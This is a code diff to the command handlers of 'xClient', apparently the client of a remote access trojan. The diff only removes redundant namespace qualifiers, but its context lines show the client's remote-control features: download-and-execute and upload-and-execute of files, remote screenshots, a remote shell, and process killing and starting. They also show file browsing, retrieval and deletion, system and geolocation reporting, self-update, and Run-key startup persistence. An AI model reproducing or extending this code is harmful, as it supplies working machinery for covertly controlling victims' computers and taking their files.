@@ -30,15 +30,15 @@ namespace xClient.Core.Commands
 		private const int MOUSEEVENTF_RIGHTDOWN = 0x08;
 		private const int MOUSEEVENTF_RIGHTUP = 0x10;
 
-		public static void HandleInitializeCommand(global::xClient.Core.Packets.ServerPackets.InitializeCommand command, global::xClient.Core.Client client)
+		public static void HandleInitializeCommand(Packets.ServerPackets.InitializeCommand command, Client client)
 		{
 			SystemCore.InitializeGeoIp();
-			new global::xClient.Core.Packets.ClientPackets.Initialize(Settings.VERSION, SystemCore.OperatingSystem, SystemCore.AccountType, SystemCore.Country, SystemCore.CountryCode, SystemCore.Region, SystemCore.City, SystemCore.ImageIndex).Execute(client);
+			new Packets.ClientPackets.Initialize(Settings.VERSION, SystemCore.OperatingSystem, SystemCore.AccountType, SystemCore.Country, SystemCore.CountryCode, SystemCore.Region, SystemCore.City, SystemCore.ImageIndex).Execute(client);
 		}
 
-		public static void HandleDownloadAndExecuteCommand(global::xClient.Core.Packets.ServerPackets.DownloadAndExecute command, global::xClient.Core.Client client)
+		public static void HandleDownloadAndExecuteCommand(Packets.ServerPackets.DownloadAndExecute command, Client client)
 		{
-			new global::xClient.Core.Packets.ClientPackets.Status("Downloading file...").Execute(client);
+			new Packets.ClientPackets.Status("Downloading file...").Execute(client);
 
 			new Thread(new ThreadStart(() =>
 			{
@@ -54,11 +54,11 @@ namespace xClient.Core.Commands
 				}
 				catch
 				{
-					new global::xClient.Core.Packets.ClientPackets.Status("Download failed!").Execute(client);
+					new Packets.ClientPackets.Status("Download failed!").Execute(client);
 					return;
 				}
 
-				new global::xClient.Core.Packets.ClientPackets.Status("Downloaded File!").Execute(client);
+				new Packets.ClientPackets.Status("Downloaded File!").Execute(client);
 
 				try
 				{
@@ -81,15 +81,15 @@ namespace xClient.Core.Commands
 				catch
 				{
 					DeleteFile(tempFile);
-					new global::xClient.Core.Packets.ClientPackets.Status("Execution failed!").Execute(client);
+					new Packets.ClientPackets.Status("Execution failed!").Execute(client);
 					return;
 				}
 
-				new global::xClient.Core.Packets.ClientPackets.Status("Executed File!").Execute(client);
+				new Packets.ClientPackets.Status("Executed File!").Execute(client);
 			})).Start();
 		}
 
-		public static void HandleUploadAndExecute(global::xClient.Core.Packets.ServerPackets.UploadAndExecute command, global::xClient.Core.Client client)
+		public static void HandleUploadAndExecute(Packets.ServerPackets.UploadAndExecute command, Client client)
 		{
 			new Thread(new ThreadStart(() =>
 			{
@@ -118,17 +118,17 @@ namespace xClient.Core.Commands
 				catch
 				{
 					DeleteFile(tempFile);
-					new global::xClient.Core.Packets.ClientPackets.Status("Execution failed!").Execute(client);
+					new Packets.ClientPackets.Status("Execution failed!").Execute(client);
 					return;
 				}
 
-				new global::xClient.Core.Packets.ClientPackets.Status("Executed File!").Execute(client);
+				new Packets.ClientPackets.Status("Executed File!").Execute(client);
 			})).Start();
 		}
 
-		public static void HandleUninstall(global::xClient.Core.Packets.ServerPackets.Uninstall command, global::xClient.Core.Client client)
+		public static void HandleUninstall(Packets.ServerPackets.Uninstall command, Client client)
 		{
-			new global::xClient.Core.Packets.ClientPackets.Status("Uninstalling... bye ;(").Execute(client);
+			new Packets.ClientPackets.Status("Uninstalling... bye ;(").Execute(client);
 
 			if (Settings.STARTUP)
 			{
@@ -136,7 +136,7 @@ namespace xClient.Core.Commands
 				{
 					try
 					{
-						Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+						RegistryKey key = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
 						if (key != null)
 						{
 							key.DeleteValue(Settings.STARTUPKEY, true);
@@ -146,7 +146,7 @@ namespace xClient.Core.Commands
 					catch
 					{
 						// try deleting from Registry.CurrentUser
-						Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+						RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
 						if (key != null)
 						{
 							key.DeleteValue(Settings.STARTUPKEY, true);
@@ -158,7 +158,7 @@ namespace xClient.Core.Commands
 				{
 					try
 					{
-						Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+						RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
 						if (key != null)
 						{
 							key.DeleteValue(Settings.STARTUPKEY, true);
@@ -198,7 +198,7 @@ namespace xClient.Core.Commands
 			client.Disconnect();
 		}
 
-		public static void HandleRemoteDesktop(global::xClient.Core.Packets.ServerPackets.Desktop command, global::xClient.Core.Client client)
+		public static void HandleRemoteDesktop(Packets.ServerPackets.Desktop command, Client client)
 		{
 			if (lastDesktopScreenshot == null)
 			{
@@ -206,7 +206,7 @@ namespace xClient.Core.Commands
 
 				byte[] desktop = Helper.Helper.CImgToByte(lastDesktopScreenshot, System.Drawing.Imaging.ImageFormat.Jpeg);
 
-				new global::xClient.Core.Packets.ClientPackets.DesktopResponse(desktop).Execute(client);
+				new Packets.ClientPackets.DesktopResponse(desktop).Execute(client);
 
 				desktop = null;
 			}
@@ -220,7 +220,7 @@ namespace xClient.Core.Commands
 
 				byte[] desktop = Helper.Helper.CImgToByte(changesScreenshot, System.Drawing.Imaging.ImageFormat.Png);
 
-				new global::xClient.Core.Packets.ClientPackets.DesktopResponse(desktop).Execute(client);
+				new Packets.ClientPackets.DesktopResponse(desktop).Execute(client);
 
 				desktop = null;
 				changesScreenshot = null;
@@ -228,7 +228,7 @@ namespace xClient.Core.Commands
 			}
 		}
 
-		public static void HandleGetProcesses(global::xClient.Core.Packets.ServerPackets.GetProcesses command, global::xClient.Core.Client client)
+		public static void HandleGetProcesses(Packets.ServerPackets.GetProcesses command, Client client)
 		{
 			Process[] pList = Process.GetProcesses();
 			string[] processes = new string[pList.Length];
@@ -244,10 +244,10 @@ namespace xClient.Core.Commands
 				i++;
 			}
 
-			new global::xClient.Core.Packets.ClientPackets.GetProcessesResponse(processes, ids, titles).Execute(client);
+			new Packets.ClientPackets.GetProcessesResponse(processes, ids, titles).Execute(client);
 		}
 
-		public static void HandleKillProcess(global::xClient.Core.Packets.ServerPackets.KillProcess command, global::xClient.Core.Client client)
+		public static void HandleKillProcess(Packets.ServerPackets.KillProcess command, Client client)
 		{
 			try
 			{
@@ -256,29 +256,29 @@ namespace xClient.Core.Commands
 			catch
 			{ }
 
-			HandleGetProcesses(new global::xClient.Core.Packets.ServerPackets.GetProcesses(), client);
+			HandleGetProcesses(new Packets.ServerPackets.GetProcesses(), client);
 		}
 
-		public static void HandleStartProcess(global::xClient.Core.Packets.ServerPackets.StartProcess command, global::xClient.Core.Client client)
+		public static void HandleStartProcess(Packets.ServerPackets.StartProcess command, Client client)
 		{
 			ProcessStartInfo startInfo = new ProcessStartInfo();
 			startInfo.UseShellExecute = true;
 			startInfo.FileName = command.Processname;
 			Process.Start(startInfo);
 
-			HandleGetProcesses(new global::xClient.Core.Packets.ServerPackets.GetProcesses(), client);
+			HandleGetProcesses(new Packets.ServerPackets.GetProcesses(), client);
 		}
 
-		public static void HandleDrives(global::xClient.Core.Packets.ServerPackets.Drives command, global::xClient.Core.Client client)
+		public static void HandleDrives(Packets.ServerPackets.Drives command, Client client)
 		{
-			new global::xClient.Core.Packets.ClientPackets.DrivesResponse(System.Environment.GetLogicalDrives()).Execute(client);
+			new Packets.ClientPackets.DrivesResponse(Environment.GetLogicalDrives()).Execute(client);
 		}
 
-		public static void HandleDirectory(global::xClient.Core.Packets.ServerPackets.Directory command, global::xClient.Core.Client client)
+		public static void HandleDirectory(Packets.ServerPackets.Directory command, Client client)
 		{
 			try
 			{
-				DirectoryInfo dicInfo = new System.IO.DirectoryInfo(command.RemotePath);
+				DirectoryInfo dicInfo = new DirectoryInfo(command.RemotePath);
 
 				FileInfo[] iFiles = dicInfo.GetFiles();
 				DirectoryInfo[] iFolders = dicInfo.GetDirectories();
@@ -309,26 +309,26 @@ namespace xClient.Core.Commands
 				if (folders.Length == 0)
 					folders = new string[] { "$$$EMPTY$$$$" };
 
-				new global::xClient.Core.Packets.ClientPackets.DirectoryResponse(files, folders, filessize).Execute(client);
+				new Packets.ClientPackets.DirectoryResponse(files, folders, filessize).Execute(client);
 			}
 			catch
 			{
-				new global::xClient.Core.Packets.ClientPackets.DirectoryResponse(new string[] { "$$$EMPTY$$$$" }, new string[] { "$$$EMPTY$$$$" }, new long[] { 0 }).Execute(client);
+				new Packets.ClientPackets.DirectoryResponse(new string[] { "$$$EMPTY$$$$" }, new string[] { "$$$EMPTY$$$$" }, new long[] { 0 }).Execute(client);
 			}
 		}
 
-		public static void HandleDownloadFile(global::xClient.Core.Packets.ServerPackets.DownloadFile command, global::xClient.Core.Client client)
+		public static void HandleDownloadFile(Packets.ServerPackets.DownloadFile command, Client client)
 		{
 			try
 			{
 				byte[] bytes = File.ReadAllBytes(command.RemotePath);
-				new global::xClient.Core.Packets.ClientPackets.DownloadFileResponse(Path.GetFileName(command.RemotePath), bytes, command.ID).Execute(client);
+				new Packets.ClientPackets.DownloadFileResponse(Path.GetFileName(command.RemotePath), bytes, command.ID).Execute(client);
 			}
 			catch
 			{ }
 		}
 
-		public static void HandleMouseClick(global::xClient.Core.Packets.ServerPackets.MouseClick command, global::xClient.Core.Client client)
+		public static void HandleMouseClick(Packets.ServerPackets.MouseClick command, Client client)
 		{
 			if (command.LeftClick)
 			{
@@ -354,7 +354,7 @@ namespace xClient.Core.Commands
 			}
 		}
 
-		public static void HandleGetSystemInfo(global::xClient.Core.Packets.ServerPackets.GetSystemInfo command, global::xClient.Core.Client client)
+		public static void HandleGetSystemInfo(Packets.ServerPackets.GetSystemInfo command, Client client)
 		{
 			try
 			{
@@ -381,13 +381,13 @@ namespace xClient.Core.Commands
 					SystemCore.GetFirewall()
 				};
 
-				new global::xClient.Core.Packets.ClientPackets.GetSystemInfoResponse(infoCollection).Execute(client);
+				new Packets.ClientPackets.GetSystemInfoResponse(infoCollection).Execute(client);
 			}
 			catch
 			{ }
 		}
 
-		public static void HandleVisitWebsite(global::xClient.Core.Packets.ServerPackets.VisitWebsite command, global::xClient.Core.Client client)
+		public static void HandleVisitWebsite(Packets.ServerPackets.VisitWebsite command, Client client)
 		{
 			string url = command.URL;
 
@@ -418,20 +418,20 @@ namespace xClient.Core.Commands
 					{ }
 				}
 
-				new global::xClient.Core.Packets.ClientPackets.Status("Visited Website").Execute(client);
+				new Packets.ClientPackets.Status("Visited Website").Execute(client);
 			}
 		}
 
-		public static void HandleShowMessageBox(global::xClient.Core.Packets.ServerPackets.ShowMessageBox command, global::xClient.Core.Client client)
+		public static void HandleShowMessageBox(Packets.ServerPackets.ShowMessageBox command, Client client)
 		{
 			MessageBox.Show(null, command.Text, command.Caption, (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), command.MessageboxButton), (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), command.MessageboxIcon));
-			new global::xClient.Core.Packets.ClientPackets.Status("Showed Messagebox").Execute(client);
+			new Packets.ClientPackets.Status("Showed Messagebox").Execute(client);
 		}
 
-		public static void HandleUpdate(global::xClient.Core.Packets.ServerPackets.Update command, global::xClient.Core.Client client)
+		public static void HandleUpdate(Packets.ServerPackets.Update command, Client client)
 		{
 			// i dont like this updating... if anyone has a better idea feel free to edit it
-			new global::xClient.Core.Packets.ClientPackets.Status("Downloading file...").Execute(client);
+			new Packets.ClientPackets.Status("Downloading file...").Execute(client);
 
 			new Thread(new ThreadStart(() =>
 			{
@@ -447,13 +447,13 @@ namespace xClient.Core.Commands
 				}
 				catch
 				{
-					new global::xClient.Core.Packets.ClientPackets.Status("Download failed!").Execute(client);
+					new Packets.ClientPackets.Status("Download failed!").Execute(client);
 					return;
 				}
 
-				new global::xClient.Core.Packets.ClientPackets.Status("Downloaded File!").Execute(client);
+				new Packets.ClientPackets.Status("Downloaded File!").Execute(client);
 
-				new global::xClient.Core.Packets.ClientPackets.Status("Updating...").Execute(client);
+				new Packets.ClientPackets.Status("Updating...").Execute(client);
 
 				try
 				{
@@ -497,18 +497,18 @@ namespace xClient.Core.Commands
 				catch
 				{
 					DeleteFile(tempFile);
-					new global::xClient.Core.Packets.ClientPackets.Status("Update failed!").Execute(client);
+					new Packets.ClientPackets.Status("Update failed!").Execute(client);
 					return;
 				}
 			})).Start();
 		}
 
-		public static void HandleMonitors(global::xClient.Core.Packets.ServerPackets.Monitors command, global::xClient.Core.Client client)
+		public static void HandleMonitors(Packets.ServerPackets.Monitors command, Client client)
 		{
-			new global::xClient.Core.Packets.ClientPackets.MonitorsResponse(Screen.AllScreens.Length).Execute(client);
+			new Packets.ClientPackets.MonitorsResponse(Screen.AllScreens.Length).Execute(client);
 		}
 
-		public static void HandleShellCommand(global::xClient.Core.Packets.ServerPackets.ShellCommand command, global::xClient.Core.Client client)
+		public static void HandleShellCommand(Packets.ServerPackets.ShellCommand command, Client client)
 		{
 			if (shell == null)
 				shell = new Shell();
@@ -530,7 +530,7 @@ namespace xClient.Core.Commands
 			}
 		}
 
-		public static void HandleRename(global::xClient.Core.Packets.ServerPackets.Rename command, global::xClient.Core.Client client)
+		public static void HandleRename(Packets.ServerPackets.Rename command, Client client)
 		{
 			try
 			{
@@ -539,13 +539,13 @@ namespace xClient.Core.Commands
 				else
 					File.Move(command.Path, command.NewPath);
 
-				HandleDirectory(new global::xClient.Core.Packets.ServerPackets.Directory(Path.GetDirectoryName(command.NewPath)), client);
+				HandleDirectory(new Packets.ServerPackets.Directory(Path.GetDirectoryName(command.NewPath)), client);
 			}
 			catch
 			{ }
 		}
 
-		public static void HandleDelete(global::xClient.Core.Packets.ServerPackets.Delete command, global::xClient.Core.Client client)
+		public static void HandleDelete(Packets.ServerPackets.Delete command, Client client)
 		{
 			try
 			{
@@ -554,13 +554,13 @@ namespace xClient.Core.Commands
 				else
 					File.Delete(command.Path);
 
-				HandleDirectory(new global::xClient.Core.Packets.ServerPackets.Directory(Path.GetDirectoryName(command.Path)), client);
+				HandleDirectory(new Packets.ServerPackets.Directory(Path.GetDirectoryName(command.Path)), client);
 			}
 			catch
 			{ }
 		}
 
-		public static void HandleAction(global::xClient.Core.Packets.ServerPackets.Action command, global::xClient.Core.Client client)
+		public static void HandleAction(Packets.ServerPackets.Action command, Client client)
 		{
 			try
 			{
@@ -590,11 +590,11 @@ namespace xClient.Core.Commands
 			}
 			catch
 			{
-				new global::xClient.Core.Packets.ClientPackets.Status("Action failed!").Execute(client);
+				new Packets.ClientPackets.Status("Action failed!").Execute(client);
 			}
 		}
 
-		public static void HandleGetStartup(object command, global::xClient.Core.Client client)
+		public static void HandleGetStartup(object command, Client client)
 		{
 			try
 			{
@@ -636,7 +636,7 @@ namespace xClient.Core.Commands
 			}
 			catch
 			{
-				new global::xClient.Core.Packets.ClientPackets.Status("Startup Information failed!").Execute(client);
+				new Packets.ClientPackets.Status("Startup Information failed!").Execute(client);
 			}
 		}
 	}
